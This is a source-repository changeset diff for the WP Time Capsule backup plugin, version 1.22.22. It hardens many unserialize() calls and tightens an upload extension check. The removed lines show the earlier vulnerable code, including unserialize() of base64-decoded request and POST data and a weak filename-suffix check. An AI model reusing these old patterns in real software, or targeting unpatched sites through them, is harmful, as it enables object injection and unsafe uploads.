  | [r2947098](/browser/wp-time-capsule/trunk/Pro/Staging/bridge/bridge.php?rev=2947098#L38 "Show revision 2947098 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/Pro/Staging/bridge/bridge.php?rev=3153289#L38 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 38 | 38 |  |
  | 39 | 39 | public function decode\_request\_data(){ |
  | 40 |  | $this->params = unserialize(base64\_decode($this->params['data'])); |
  |  | 40 | $this->params = unserialize(base64\_decode($this->params['data']), ['allowed\_classes' => false]); |
  | 41 | 41 | } |
  | 42 | 42 |  |
* ## [wp-time-capsule/trunk/Pro/Staging/class-update-in-staging.php](/changeset/3153289/wp-time-capsule/trunk/Pro/Staging/class-update-in-staging.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/Pro/Staging/class-update-in-staging.php")

  | [r2947098](/browser/wp-time-capsule/trunk/Pro/Staging/class-update-in-staging.php?rev=2947098#L83 "Show revision 2947098 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/Pro/Staging/class-update-in-staging.php?rev=3153289#L83 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 83 | 83 | return false; |
  | 84 | 84 | } |
  | 85 |  | $upgrade\_details = unserialize($raw\_upgrade\_details); |
  |  | 85 | $upgrade\_details = unserialize($raw\_upgrade\_details, ['allowed\_classes' => false]); |
  | 86 | 86 | wptc\_log($upgrade\_details, '---------$upgrade\_details------------'); |
  | 87 | 87 | if (empty($upgrade\_details) || !is\_array($upgrade\_details)) { |
* ## [wp-time-capsule/trunk/Pro/Staging/init.php](/changeset/3153289/wp-time-capsule/trunk/Pro/Staging/init.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/Pro/Staging/init.php")

  | [r2954798](/browser/wp-time-capsule/trunk/Pro/Staging/init.php?rev=2954798#L118 "Show revision 2954798 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/Pro/Staging/init.php?rev=3153289#L118 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 118 | 118 | } |
  | 119 | 119 |  |
  | 120 |  | $unserialized\_details = unserialize($serialized\_details); |
  |  | 120 | $unserialized\_details = unserialize($serialized\_details, ['allowed\_classes' => false]); |
  | 121 | 121 | if (empty($unserialized\_details)) { |
  | 122 | 122 | if(empty($param)){ |
  | […](/browser/wp-time-capsule/trunk/Pro/Staging/init.php?rev=2954798#L1367) | […](/browser/wp-time-capsule/trunk/Pro/Staging/init.php?rev=3153289#L1367) |  |
  | 1367 | 1367 | $db\_prefix = $this->get\_staging\_db\_prefix('prefix'); |
  | 1368 | 1368 | $new\_table  = $db\_prefix . '\_' . $table; |
  | 1369 |  | $this->staging\_common->clone\_table\_structure($table, $new\_table); |
  |  | 1369 | // $this->staging\_common->clone\_table\_structure($table, $new\_table); |
  |  | 1370 |  |
  |  | 1371 | $table\_meta = $this->staging\_common->get\_table\_data($table); |
  |  | 1372 | extract($table\_meta); |
  |  | 1373 |  |
  |  | 1374 | if ($is\_new) { |
  |  | 1375 | $result = $this->staging\_common->clone\_table\_structure($table, $new\_table); |
  |  | 1376 |  |
  |  | 1377 | if ($result === false) { |
  |  | 1378 | $this->processed\_db->update\_iterator($table, -1); //Done |
  |  | 1379 | continue; |
  |  | 1380 | } |
  |  | 1381 | } |
  | 1370 | 1382 |  |
  | 1371 | 1383 | if (empty($type) || $type !== 'full' || $type === 'schema') { |
  | […](/browser/wp-time-capsule/trunk/Pro/Staging/init.php?rev=2954798#L1373) | […](/browser/wp-time-capsule/trunk/Pro/Staging/init.php?rev=3153289#L1385) |  |
  | 1373 | 1385 | } |
  | 1374 | 1386 |  |
  | 1375 |  | $this->staging\_common->clone\_table\_content($table, $new\_table, $limit = WPTC\_STAGING\_DEFAULT\_COPY\_DB\_ROWS\_LIMIT, $offset = 0); |
  |  | 1387 | $limit = $this->options->get\_option('internal\_staging\_db\_rows\_copy\_limit'); |
  |  | 1388 |  |
  |  | 1389 | if (empty($limit)) { |
  |  | 1390 | $limit = WPTC\_STAGING\_DEFAULT\_COPY\_DB\_ROWS\_LIMIT; //fallback to default value |
  |  | 1391 | } |
  |  | 1392 |  |
  |  | 1393 | if(empty($offset)){ |
  |  | 1394 | $offset = 0; |
  |  | 1395 | } |
  |  | 1396 |  |
  |  | 1397 | $this->staging\_common->clone\_table\_content($table, $new\_table, $limit, $offset); |
  | 1376 | 1398 | } |
  | 1377 | 1399 | } |
* ## [wp-time-capsule/trunk/Pro/Staging/stage-to-live/includes/class-stage-to-live.php](/changeset/3153289/wp-time-capsule/trunk/Pro/Staging/stage-to-live/includes/class-stage-to-live.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/Pro/Staging/stage-to-live/includes/class-stage-to-live.php")

  | [r2947098](/browser/wp-time-capsule/trunk/Pro/Staging/stage-to-live/includes/class-stage-to-live.php?rev=2947098#L282 "Show revision 2947098 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/Pro/Staging/stage-to-live/includes/class-stage-to-live.php?rev=3153289#L282 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 282 | 282 | $tables = false; |
  | 283 | 283 | if (!empty($raw\_result)) { |
  | 284 |  | $tables = @unserialize($raw\_result); |
  |  | 284 | $tables = @unserialize($raw\_result, ['allowed\_classes' => false]); |
  | 285 | 285 | } |
  | 286 | 286 |  |
  | […](/browser/wp-time-capsule/trunk/Pro/Staging/stage-to-live/includes/class-stage-to-live.php?rev=2947098#L314) | […](/browser/wp-time-capsule/trunk/Pro/Staging/stage-to-live/includes/class-stage-to-live.php?rev=3153289#L314) |  |
  | 314 | 314 | private function get\_hash\_by\_folders(){ |
  | 315 | 315 | wptc\_manual\_debug('', 'start\_get\_hash\_by\_folder\_S2L'); |
  |  | 316 | wptc\_log('', '---------------get\_hash\_by\_folders-----------------'); |
  | 316 | 317 |  |
  | 317 | 318 | $break = false; |
  | […](/browser/wp-time-capsule/trunk/Pro/Staging/stage-to-live/includes/class-stage-to-live.php?rev=2947098#L337) | […](/browser/wp-time-capsule/trunk/Pro/Staging/stage-to-live/includes/class-stage-to-live.php?rev=3153289#L338) |  |
  | 337 | 338 |  |
  | 338 | 339 | // wptc\_log(array(), '--------Running--------'); |
  |  | 340 |  |
  | 339 | 341 | if(wptc\_is\_dir($path)){ |
  | 340 | 342 | $this->get\_hash\_dir($relative\_path, $dir\_meta->offset, $temp\_counter, $deep\_dirs); |
  | […](/browser/wp-time-capsule/trunk/Pro/Staging/stage-to-live/includes/class-stage-to-live.php?rev=2947098#L353) | […](/browser/wp-time-capsule/trunk/Pro/Staging/stage-to-live/includes/class-stage-to-live.php?rev=3153289#L355) |  |
  | 353 | 355 | $file = $iterator->getPathname(); |
  | 354 | 356 |  |
  |  | 357 | // wptc\_log($file, '---------------process\_file-----------------'); |
  | 355 | 358 | if (!$iterator->isReadable()) { |
  |  | 359 | wptc\_log($file, '--------iterator process\_file not readable--------'); |
  | 356 | 360 | return ; |
  | 357 | 361 | } |
  | […](/browser/wp-time-capsule/trunk/Pro/Staging/stage-to-live/includes/class-stage-to-live.php?rev=2947098#L393) | […](/browser/wp-time-capsule/trunk/Pro/Staging/stage-to-live/includes/class-stage-to-live.php?rev=3153289#L397) |  |
  | 393 | 397 | $is\_recursive = ($deep\_dirs) ? false : true; |
  | 394 | 398 |  |
  |  | 399 | // wptc\_log($path, '---------------get\_hash\_dir-----------------'); |
  | 395 | 400 | try{ |
  | 396 | 401 | $seek\_file\_iterator->process\_iterator($path, $offset, $is\_recursive); |
  | […](/browser/wp-time-capsule/trunk/Pro/Staging/stage-to-live/includes/class-stage-to-live.php?rev=2947098#L796) | […](/browser/wp-time-capsule/trunk/Pro/Staging/stage-to-live/includes/class-stage-to-live.php?rev=3153289#L801) |  |
  | 796 | 801 | } |
  | 797 | 802 |  |
  | 798 |  | $is\_wptc\_request = @unserialize(base64\_decode($\_REQUEST['data'])); |
  |  | 803 | $is\_wptc\_request = @unserialize(base64\_decode($\_REQUEST['data']), ['allowed\_classes' => false]); |
  | 799 | 804 |  |
  | 800 | 805 | wptc\_log($is\_wptc\_request, '---------------$is\_wptc\_request-----------------'); |
* ## [wp-time-capsule/trunk/Pro/Vulns/init.php](/changeset/3153289/wp-time-capsule/trunk/Pro/Vulns/init.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/Pro/Vulns/init.php")

  | [r2947098](/browser/wp-time-capsule/trunk/Pro/Vulns/init.php?rev=2947098#L271 "Show revision 2947098 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/Pro/Vulns/init.php?rev=3153289#L271 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 271 | 271 | } |
  | 272 | 272 |  |
  | 273 |  | $settings = unserialize($settings\_serialized); |
  |  | 273 | $settings = unserialize($settings\_serialized, ['allowed\_classes' => false]); |
  | 274 | 274 |  |
  | 275 | 275 | return empty($settings) ? array() : $settings; |
  | […](/browser/wp-time-capsule/trunk/Pro/Vulns/init.php?rev=2947098#L284) | […](/browser/wp-time-capsule/trunk/Pro/Vulns/init.php?rev=3153289#L284) |  |
  | 284 | 284 | $vulns\_settings = $this->get\_vulns\_settings(); |
  | 285 | 285 |  |
  | 286 |  | $excluded\_themes = empty($vulns\_settings['themes']['excluded']) ? array() : unserialize($vulns\_settings['themes']['excluded']); |
  |  | 286 | $excluded\_themes = empty($vulns\_settings['themes']['excluded']) ? array() : unserialize($vulns\_settings['themes']['excluded'], ['allowed\_classes' => false]); |
  | 287 | 287 |  |
  | 288 | 288 | if (empty($excluded\_themes)) { |
  | […](/browser/wp-time-capsule/trunk/Pro/Vulns/init.php?rev=2947098#L307) | […](/browser/wp-time-capsule/trunk/Pro/Vulns/init.php?rev=3153289#L307) |  |
  | 307 | 307 | $plugins = array(); |
  | 308 | 308 | $vulns\_settings = $this->get\_vulns\_settings(); |
  | 309 |  | $excluded\_plugins = empty($vulns\_settings['plugins']['excluded']) ? array() : unserialize($vulns\_settings['plugins']['excluded']); |
  |  | 309 | $excluded\_plugins = empty($vulns\_settings['plugins']['excluded']) ? array() : unserialize($vulns\_settings['plugins']['excluded'], ['allowed\_classes' => false]); |
  | 310 | 310 |  |
  | 311 | 311 | $i=0; |
  | […](/browser/wp-time-capsule/trunk/Pro/Vulns/init.php?rev=2947098#L379) | […](/browser/wp-time-capsule/trunk/Pro/Vulns/init.php?rev=3153289#L379) |  |
  | 379 | 379 | $vulns\_settings = $this->get\_vulns\_settings(); |
  | 380 | 380 |  |
  | 381 |  | $excluded\_themes = empty($vulns\_settings['themes']['excluded']) ? array() : unserialize($vulns\_settings['themes']['excluded']); |
  | 382 |  | $excluded\_plugins = empty($vulns\_settings['plugins']['excluded']) ? array() : unserialize($vulns\_settings['plugins']['excluded']); |
  |  | 381 | $excluded\_themes = empty($vulns\_settings['themes']['excluded']) ? array() : unserialize($vulns\_settings['themes']['excluded'], ['allowed\_classes' => false]); |
  |  | 382 | $excluded\_plugins = empty($vulns\_settings['plugins']['excluded']) ? array() : unserialize($vulns\_settings['plugins']['excluded'], ['allowed\_classes' => false]); |
  | 383 | 383 |  |
  | 384 | 384 | return array( |
* ## [wp-time-capsule/trunk/Views/wptc-plans.php](/changeset/3153289/wp-time-capsule/trunk/Views/wptc-plans.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/Views/wptc-plans.php")

  | [r2947098](/browser/wp-time-capsule/trunk/Views/wptc-plans.php?rev=2947098#L282 "Show revision 2947098 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/Views/wptc-plans.php?rev=3153289#L282 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 282 | 282 | } |
  | 283 | 283 |  |
  | 284 |  | $plans = unserialize($plans); |
  |  | 284 | $plans = unserialize($plans, ['allowed\_classes' => false]); |
  | 285 | 285 |  |
  | 286 | 286 | $html = '<div class="wptc-select-plans-div"> |
* ## [wp-time-capsule/trunk/readme.txt](/changeset/3153289/wp-time-capsule/trunk/readme.txt "Show the changeset 3153289 restricted to wp-time-capsule/trunk/readme.txt")

  | [r3117515](/browser/wp-time-capsule/trunk/readme.txt?rev=3117515#L4 "Show revision 3117515 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/readme.txt?rev=3153289#L4 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 4 | 4 | Tags: backup, staging, migration, backup before update, auto updates. |
  | 5 | 5 | Requires at least: 3.9.14 |
  | 6 |  | Tested up to: 6.~~5.5~~ |
  | 7 |  | Stable tag: 1.22.2~~1~~ |
  |  | 6 | Tested up to: 6.6.2 |
  |  | 7 | Stable tag: 1.22.22 |
  | 8 | 8 | License: GPLv2 or later |
  | 9 | 9 | License URI: http://www.gnu.org/licenses/gpl-2.0.html |
  | […](/browser/wp-time-capsule/trunk/readme.txt?rev=3117515#L102) | […](/browser/wp-time-capsule/trunk/readme.txt?rev=3153289#L102) |  |
  | 102 | 102 |  |
  | 103 | 103 | == Changelog == |
  |  | 104 | = 1.22.22 = |
  |  | 105 | \*Release Date - 17 Sep 2024\* |
  |  | 106 |  |
  |  | 107 | \* Improvement : Manual decrypting of the encrypted DB file feature is improved. Now file extensions are properly checked. |
  |  | 108 | \* Improvement : Improved unserialize mechanism. |
  |  | 109 | \* Improvement : Improved activity log MySQL queries. |
  |  | 110 | \* Fix : Update in staging did not work in a few cases. |
  |  | 111 | \* Fix : Staging to live failed in a few cases. |
  | 104 | 112 |  |
  | 105 | 113 | = 1.22.21 = |
  | […](/browser/wp-time-capsule/trunk/readme.txt?rev=3117515#L454) | […](/browser/wp-time-capsule/trunk/readme.txt?rev=3153289#L462) |  |
  | 454 | 462 | \* Fix: Stop the Backup when Dropbox API limit is reached. |
  | 455 | 463 |  |
  | 456 |  | ~~= 1.21.3 =~~ |
  | 457 |  | ~~\*Release Date - 13 Mar 2019\*~~ |
  | 458 |  |  |
  | 459 |  | ~~\* Fix: Dropbox API increased the server load.~~ |
  | 460 |  |  |
  | 461 |  | ~~= 1.21.2 =~~ |
  | 462 |  | ~~\*Release Date - 8 Jan 2019\*~~ |
  | 463 |  |  |
  | 464 |  | ~~\* Fix: Fatal error on multisite staging site.~~ |
  | 465 |  |  |
  | 466 |  | ~~= 1.21.1 =~~ |
  | 467 |  | ~~\*Release Date - 16 Dec 2018\*~~ |
  | 468 |  |  |
  | 469 |  | ~~\* Fix: Fatal error on PHP 5.4.~~ |
  | 470 |  |  |
  | 471 |  | ~~= 1.21.0 =~~ |
  | 472 |  | ~~\*Release Date - 14 Dec 2018\*~~ |
  | 473 |  |  |
  | 474 |  | ~~\* Feature: Support for Wasabi Cloud Storage.~~ |
  | 475 |  | ~~\* Feature: You can configure the initial setup in bulk.~~ |
  | 476 |  | ~~\* Feature: WPTC staging plugin will be updated to the latest version automatically.~~ |
  | 477 |  | ~~\* Feature: Live site white-label settings are applied to your staging site.~~ |
  | 478 |  |  |
  | 479 |  | ~~\* Improvement: By default, WP Redis cache plugin files are excluded during the staging creation.~~ |
  | 480 |  |  |
  | 481 |  | ~~\* Fix: DB rows per batch limit value didn't get updated after making the changes.~~ |
  | 482 |  | ~~\* Fix: Staging Database tables are not deleted while deleting staging the site.~~ |
  | 483 |  | ~~\* Fix: Plugin screenshot settings were hidden in a few scenarios.~~ |
  | 484 |  |  |
  | 485 |  |  |
* ## [wp-time-capsule/trunk/wp-tcapsule-bridge/pclzip.class.php](/changeset/3153289/wp-time-capsule/trunk/wp-tcapsule-bridge/pclzip.class.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/wp-tcapsule-bridge/pclzip.class.php")

  | [r2912489](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/pclzip.class.php?rev=2912489#L690 "Show revision 2912489 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/pclzip.class.php?rev=3153289#L690 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 690 | 690 |  |
  | 691 | 691 | $fieldParams = base64\_decode($backupData->$field); |
  | 692 |  | $fieldParams = unserialize($fieldParams); |
  |  | 692 | $fieldParams = unserialize($fieldParams, ['allowed\_classes' => false]); |
  | 693 | 693 | } |
  | 694 | 694 | else |
* ## [wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php](/changeset/3153289/wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php")

  | [r2947098](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php?rev=2947098#L383 "Show revision 2947098 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php?rev=3153289#L383 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 383 | 383 | } |
  | 384 | 384 |  |
  | 385 |  |  |
  | 386 |  |  |
  | 387 |  | ~~$allowed\_extensions = array('.sql', '.gz', '.crypt');~~ |
  | 388 |  | ~~$found = false;~~ |
  | 389 |  | ~~foreach ($allowed\_extensions as $extension) {~~ |
  | 390 |  | if(strrpos($file->name, $extension) + strlen($extension) === strlen($file->name)){ |
  | 391 |  | ~~$found = true~~; |
  | 392 |  | } |
  | 393 |  | ~~}~~ |
  | 394 |  |  |
  | 395 |  | if~~(!$found)~~ { |
  |  | 385 | $mimes = array( |
  |  | 386 | 'sql'    => 'application/sql', |
  |  | 387 | 'gz'     => 'application/gzip', |
  |  | 388 | 'crypt'  => 'application/octet-stream', |
  |  | 389 | ); |
  |  | 390 |  |
  |  | 391 | $allowed\_extesions = ['sql', 'gz', 'crypt']; |
  |  | 392 |  |
  |  | 393 | $file\_extension = pathinfo($file->name, PATHINFO\_EXTENSION); |
  |  | 394 |  |
  |  | 395 | if(!in\_array($file\_extension, $allowed\_extesions)){ |
  | 396 | 396 | $file->error = $this->get\_error\_message('accept\_file\_types'); |
  | 397 | 397 | return false; |
* ## [wp-time-capsule/trunk/wp-tcapsule-bridge/wp-modified-functions.php](/changeset/3153289/wp-time-capsule/trunk/wp-tcapsule-bridge/wp-modified-functions.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/wp-tcapsule-bridge/wp-modified-functions.php")

  | [r2251340](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/wp-modified-functions.php?rev=2251340#L791 "Show revision 2251340 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/wp-modified-functions.php?rev=3153289#L791 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 791 | 791 | } |
  | 792 | 792 |  |
  |  | 793 | if (!function\_exists('get\_bloginfo')) { |
  |  | 794 | function get\_bloginfo( $show = '', $filter = 'raw' ) { |
  |  | 795 | switch ( $show ) { |
  |  | 796 | case 'home':    // Deprecated. |
  |  | 797 | case 'siteurl': // Deprecated. |
  |  | 798 | \_deprecated\_argument( |
  |  | 799 | \_\_FUNCTION\_\_, |
  |  | 800 | '2.2.0', |
  |  | 801 | sprintf( |
  |  | 802 | /\* translators: 1: 'siteurl'/'home' argument, 2: bloginfo() function name, 3: 'url' argument. \*/ |
  |  | 803 | \_\_( 'The %1$s option is deprecated for the family of %2$s functions. Use the %3$s option instead.' ), |
  |  | 804 | '<code>' . $show . '</code>', |
  |  | 805 | '<code>bloginfo()</code>', |
  |  | 806 | '<code>url</code>' |
  |  | 807 | ) |
  |  | 808 | ); |
  |  | 809 | // Intentional fall-through to be handled by the 'url' case. |
  |  | 810 | case 'url': |
  |  | 811 | $output = home\_url(); |
  |  | 812 | break; |
  |  | 813 | case 'wpurl': |
  |  | 814 | $output = site\_url(); |
  |  | 815 | break; |
  |  | 816 | case 'description': |
  |  | 817 | $output = get\_option( 'blogdescription' ); |
  |  | 818 | break; |
  |  | 819 | case 'rdf\_url': |
  |  | 820 | $output = get\_feed\_link( 'rdf' ); |
  |  | 821 | break; |
  |  | 822 | case 'rss\_url': |
  |  | 823 | $output = get\_feed\_link( 'rss' ); |
  |  | 824 | break; |
  |  | 825 | case 'rss2\_url': |
  |  | 826 | $output = get\_feed\_link( 'rss2' ); |
  |  | 827 | break; |
  |  | 828 | case 'atom\_url': |
  |  | 829 | $output = get\_feed\_link( 'atom' ); |
  |  | 830 | break; |
  |  | 831 | case 'comments\_atom\_url': |
  |  | 832 | $output = get\_feed\_link( 'comments\_atom' ); |
  |  | 833 | break; |
  |  | 834 | case 'comments\_rss2\_url': |
  |  | 835 | $output = get\_feed\_link( 'comments\_rss2' ); |
  |  | 836 | break; |
  |  | 837 | case 'pingback\_url': |
  |  | 838 | $output = site\_url( 'xmlrpc.php' ); |
  |  | 839 | break; |
  |  | 840 | case 'stylesheet\_url': |
  |  | 841 | $output = get\_stylesheet\_uri(); |
  |  | 842 | break; |
  |  | 843 | case 'stylesheet\_directory': |
  |  | 844 | $output = get\_stylesheet\_directory\_uri(); |
  |  | 845 | break; |
  |  | 846 | case 'template\_directory': |
  |  | 847 | case 'template\_url': |
  |  | 848 | $output = get\_template\_directory\_uri(); |
  |  | 849 | break; |
  |  | 850 | case 'admin\_email': |
  |  | 851 | $output = get\_option( 'admin\_email' ); |
  |  | 852 | break; |
  |  | 853 | case 'charset': |
  |  | 854 | $output = get\_option( 'blog\_charset' ); |
  |  | 855 | if ( '' === $output ) { |
  |  | 856 | $output = 'UTF-8'; |
  |  | 857 | } |
  |  | 858 | break; |
  |  | 859 | case 'html\_type': |
  |  | 860 | $output = get\_option( 'html\_type' ); |
  |  | 861 | break; |
  |  | 862 | case 'version': |
  |  | 863 | global $wp\_version; |
  |  | 864 | $output = $wp\_version; |
  |  | 865 | break; |
  |  | 866 | case 'language': |
  |  | 867 | /\* |
  |  | 868 | \* translators: Translate this to the correct language tag for your locale, |
  |  | 869 | \* see https://www.w3.org/International/articles/language-tags/ for reference. |
  |  | 870 | \* Do not translate into your own language. |
  |  | 871 | \*/ |
  |  | 872 | $output = \_\_( 'html\_lang\_attribute' ); |
  |  | 873 | if ( 'html\_lang\_attribute' === $output || preg\_match( '/[^a-zA-Z0-9-]/', $output ) ) { |
  |  | 874 | $output = determine\_locale(); |
  |  | 875 | $output = str\_replace( '\_', '-', $output ); |
  |  | 876 | } |
  |  | 877 | break; |
  |  | 878 | case 'text\_direction': |
  |  | 879 | \_deprecated\_argument( |
  |  | 880 | \_\_FUNCTION\_\_, |
  |  | 881 | '2.2.0', |
  |  | 882 | sprintf( |
  |  | 883 | /\* translators: 1: 'text\_direction' argument, 2: bloginfo() function name, 3: is\_rtl() function name. \*/ |
  |  | 884 | \_\_( 'The %1$s option is deprecated for the family of %2$s functions. Use the %3$s function instead.' ), |
  |  | 885 | '<code>' . $show . '</code>', |
  |  | 886 | '<code>bloginfo()</code>', |
  |  | 887 | '<code>is\_rtl()</code>' |
  |  | 888 | ) |
  |  | 889 | ); |
  |  | 890 | if ( function\_exists( 'is\_rtl' ) ) { |
  |  | 891 | $output = is\_rtl() ? 'rtl' : 'ltr'; |
  |  | 892 | } else { |
  |  | 893 | $output = 'ltr'; |
  |  | 894 | } |
  |  | 895 | break; |
  |  | 896 | case 'name': |
  |  | 897 | default: |
  |  | 898 | $output = get\_option( 'blogname' ); |
  |  | 899 | break; |
  |  | 900 | } |
  |  | 901 |  |
  |  | 902 | if ( 'display' === $filter ) { |
  |  | 903 | if ( |
  |  | 904 | str\_contains( $show, 'url' ) |
  |  | 905 | || str\_contains( $show, 'directory' ) |
  |  | 906 | || str\_contains( $show, 'home' ) |
  |  | 907 | ) { |
  |  | 908 | /\*\* |
  |  | 909 | \* Filters the URL returned by get\_bloginfo(). |
  |  | 910 | \* |
  |  | 911 | \* @since 2.0.5 |
  |  | 912 | \* |
  |  | 913 | \* @param string $output The URL returned by bloginfo(). |
  |  | 914 | \* @param string $show   Type of information requested. |
  |  | 915 | \*/ |
  |  | 916 | $output = apply\_filters( 'bloginfo\_url', $output, $show ); |
  |  | 917 | } else { |
  |  | 918 | /\*\* |
  |  | 919 | \* Filters the site information returned by get\_bloginfo(). |
  |  | 920 | \* |
  |  | 921 | \* @since 0.71 |
  |  | 922 | \* |
  |  | 923 | \* @param mixed  $output The requested non-URL site information. |
  |  | 924 | \* @param string $show   Type of information requested. |
  |  | 925 | \*/ |
  |  | 926 | $output = apply\_filters( 'bloginfo', $output, $show ); |
  |  | 927 | } |
  |  | 928 | } |
  |  | 929 |  |
  |  | 930 | return $output; |
  |  | 931 | } |
  |  | 932 | } |
  | 793 | 933 | if (!function\_exists('map\_deep')) { |
  | 794 | 934 | function map\_deep( $value, $callback ) { |
* ## [wp-time-capsule/trunk/wp-tcapsule-bridge/wptc-ajax.php](/changeset/3153289/wp-time-capsule/trunk/wp-tcapsule-bridge/wptc-ajax.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/wp-tcapsule-bridge/wptc-ajax.php")

  | [r2947098](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/wptc-ajax.php?rev=2947098#L225 "Show revision 2947098 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/wptc-ajax.php?rev=3153289#L225 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 225 | 225 | $this->proper\_restore\_complete\_exit(array('error' => 'Didnt get Files to Restore')); |
  | 226 | 226 | } |
  | 227 |  | $data = unserialize($data); |
  |  | 227 | $data = unserialize($data, ['allowed\_classes' => false]); |
  | 228 | 228 | } |
  | 229 | 229 |  |
  | […](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/wptc-ajax.php?rev=2947098#L786) | […](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/wptc-ajax.php?rev=3153289#L786) |  |
  | 786 | 786 | } |
  | 787 | 787 |  |
  | 788 |  | $files\_to\_restore\_tmp = unserialize($selected\_files\_temp\_restore); |
  |  | 788 | $files\_to\_restore\_tmp = unserialize($selected\_files\_temp\_restore, ['allowed\_classes' => false]); |
  | 789 | 789 |  |
  | 790 | 790 | wptc\_log($files\_to\_restore\_tmp, "--------files\_to\_restore\_tmp--------"); |
* ## [wp-time-capsule/trunk/wp-time-capsule.php](/changeset/3153289/wp-time-capsule/trunk/wp-time-capsule.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/wp-time-capsule.php")

  | [r3117515](/browser/wp-time-capsule/trunk/wp-time-capsule.php?rev=3117515#L5 "Show revision 3117515 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/wp-time-capsule.php?rev=3153289#L5 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 5 | 5 | Description: Backup and Staging by WP Time Capsule is an incremental schedule backup plugin that backups up your website to Dropbox, Google Drive, Amazon S3, etc. |
  | 6 | 6 | Author: Revmakx |
  | 7 |  | Version: 1.22.2~~1~~ |
  |  | 7 | Version: 1.22.22 |
  | 8 | 8 | Author URI: http://www.revmakx.com |
  | 9 |  | Tested up to: 6.~~5.5~~ |
  |  | 9 | Tested up to: 6.6.2 |
  | 10 | 10 | License:           GPL-2.0+ |
  | 11 | 11 | License URI:       http://www.gnu.org/licenses/gpl-2.0.txt |
  | […](/browser/wp-time-capsule/trunk/wp-time-capsule.php?rev=3117515#L814) | […](/browser/wp-time-capsule/trunk/wp-time-capsule.php?rev=3153289#L814) |  |
  | 814 | 814 | $options->create\_dump\_dir(); |
  | 815 | 815 | $options->set\_option('is\_running', true); |
  | 816 |  | $contents = @unserialize($options->get\_option('this\_cookie')); |
  |  | 816 | $contents = @unserialize($options->get\_option('this\_cookie'), ['allowed\_classes' => false]); |
  | 817 | 817 | $backup\_id = $contents['backupID']; |
  | 818 | 818 |  |
  | […](/browser/wp-time-capsule/trunk/wp-time-capsule.php?rev=3117515#L2536) | […](/browser/wp-time-capsule/trunk/wp-time-capsule.php?rev=3153289#L2536) |  |
  | 2536 | 2536 | $connected\_obj = WPTC\_Factory::get('g\_drive'); |
  | 2537 | 2537 | $email = trim($config->get\_option('main\_account\_email', true)); |
  | 2538 |  | $refresh\_token\_arr = unserialize(wp\_unslash($\_POST['credsData']['g\_drive\_refresh\_token'])); |
  |  | 2538 | $refresh\_token\_arr = unserialize(wp\_unslash($\_POST['credsData']['g\_drive\_refresh\_token']), ['allowed\_classes' => false]); |
  | 2539 | 2539 | $result['authorize\_url'] = network\_admin\_url() . 'admin.php?page=wp-time-capsule&wptc\_account\_email='.$email. '&cloud\_auth\_action=g\_drive&code='.$refresh\_token\_arr['refresh\_token']; |
  | 2540 | 2540 | die(json\_encode($result)); |
  | […](/browser/wp-time-capsule/trunk/wp-time-capsule.php?rev=3117515#L3587) | […](/browser/wp-time-capsule/trunk/wp-time-capsule.php?rev=3153289#L3587) |  |
  | 3587 | 3587 | } |
  | 3588 | 3588 |  |
  | 3589 |  | $notice = unserialize($notice); |
  |  | 3589 | $notice = unserialize($notice, ['allowed\_classes' => false]); |
  | 3590 | 3590 |  |
  | 3591 | 3591 | if ($notice['do\_not\_delete']) { |
* ## [wp-time-capsule/trunk/wptc-constants.php](/changeset/3153289/wp-time-capsule/trunk/wptc-constants.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/wptc-constants.php")

  | [r3116762](/browser/wp-time-capsule/trunk/wptc-constants.php?rev=3116762#L76 "Show revision 3116762 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/wptc-constants.php?rev=3153289#L76 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 76 | 76 |  |
  | 77 | 77 | public function versions(){ |
  | 78 |  | $this->define( 'WPTC\_VERSION', '1.22.2~~1~~' ); |
  |  | 78 | $this->define( 'WPTC\_VERSION', '1.22.22' ); |
